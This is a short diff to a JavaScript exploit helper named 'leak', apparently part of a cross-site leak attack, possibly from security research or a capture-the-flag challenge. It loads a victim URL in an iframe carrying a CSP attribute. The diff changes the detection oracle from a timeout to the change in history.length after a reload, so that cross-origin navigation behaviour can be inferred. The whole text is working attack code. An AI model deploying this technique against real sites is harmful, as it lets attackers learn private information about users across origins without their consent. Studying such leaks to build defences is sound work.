@@ -3,18 +3,26 @@ const leak = async(url, csp='default-src \'self\';') => {
         let i = document.createElement('iframe')
         i.setAttribute('csp', csp)
         i.src = url
-        i.onload = () => {
-            // overwrite onload 
-            i.onload = () => {
-                i.remove()
-                return r(0)
-            }
-            i.src = url + '#'
+        
+        let h0 = history.length
+
+        // max history is 50 
+        if(h0 > 48){
+            throw new Error('History to long')
         }
-        let t = setTimeout(() => {
-            i.remove()
-            return r(1)
-        }, 2000)
+
+        i.onload = () => {
+            // overwrite onload
+            i.onload = () => {
+                let h1 = history.length
+                i.remove()
+                return r(h1 - h0)
+            }
+
+            // reload 
+            i.src = url
+
+        }
         document.body.append(i)
     })
 
